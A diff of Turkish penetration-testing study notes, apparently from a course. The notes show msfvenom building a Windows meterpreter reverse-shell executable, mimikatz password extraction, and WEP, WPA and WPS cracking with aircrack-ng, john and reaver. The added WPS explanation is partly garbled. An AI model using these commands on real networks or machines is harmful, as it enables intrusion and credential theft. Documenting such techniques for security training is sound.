@@ -7,7 +7,7 @@
 => msfvenom -l (listeleme)
 
 -msfvenom exe dosyası : 
-=> msfvenom -p windows/meterpreter/reverse_tcp LHOST 192.168.0.10 LPORT=3216 -f exe > venom.exe
+=> msfvenom -p windows/meterpreter/reverse_tcp LHOST 192.168.0.10 LPORT=3216 -f exe -o venom.exe
 -mimikatz :
 => load mimikatz
 => mimikatz_command -f sekurlsa::searchPasswords
@@ -18,7 +18,7 @@
 
 -Kablosuz ağ sinyalleri eskiden herkese açık bir şekilde yayınlandığı için (radyo gibi) herkes tarafından takip edilebiliyordu.
 
--Öneri: Tp-Link WN722N Alpha Chipset (051, 036), Kali Linux Wireless Pen. Testing (Kitap önerisi)
+-Öneri: Tp-Link WN722N, Alpha Chipset (051, 036), Kali Linux Wireless Pen. Testing (Kitap önerisi)
 
 -BSSID: Erişim noktasının (Access Point) MAC adresi.
 
@@ -93,7 +93,7 @@
 => aireplay-ng --arpreplay -b C0:4A:00:E9:08:2C wlan0mon (paket enjekte eder)
 => (64bit için = DATA 5.000, 128bit için = DATA 35.000-40.000) aircrack-ng lyk2016.cap (KEY FOUND!)
 
--WPA/2: Brute-force'a açık. Ağa bağlı bir istemci yoksa kırılamaz.
+-WPA/2: Four-way handshake'e dayanır. Brute-force'a açık. Ağa bağlı bir istemci yoksa kırılamaz.
 
 => Yukarıdaki işlemleri tekrar et. Ön koşullar: bir istemcinin WPA/2 ağındaki oturumunu baştan sona kaydetmek. Bağlı istemcileri düşürüp tekrar bağlanmasını sağlayarak veya istemcinin bağlanmasını bekleyerek yapılabilir.
 
@@ -109,12 +109,16 @@
 
 => john --incremental --stdout | aircrack-ng lyk2016wpa4-01.cap -b BSSID -w -
 
----(EKSİK)-Wireshark filter: wlan 
--ieee802.11 
+---Wireshark filter: wlan 
+-Edit
+-Preferences
+-Protocols
+-ieee 802.11
+-Decryption Keys: Edit 
 -wpa-pwd
 -pass:essid
 
----WPS: 10^7+checksum. İki parça şeklinde, 4 + 3 gönderiliyor. İlk 4'lük doğruysa geri kalan 3 yollanır.
+---WPS: 8 bitlik doğruluma kullanılır. 10^7 (1 bit tahminle yaklaşık 8 saatte çözülebilir. İki parça şeklinde, 4 + 3 gönderiliyor. İlk 4'lük doğruysa geri kalan 3 yollanır.
 
-=> wash -i wlan0mon
-=> reaver -i wlan0mon -b BSSID -vv
+=> wash -i wlan0mon -wps'li AP'leri bulur
+=> reaver -i wlan0mon -b BSSID -vv (-p <pin>)
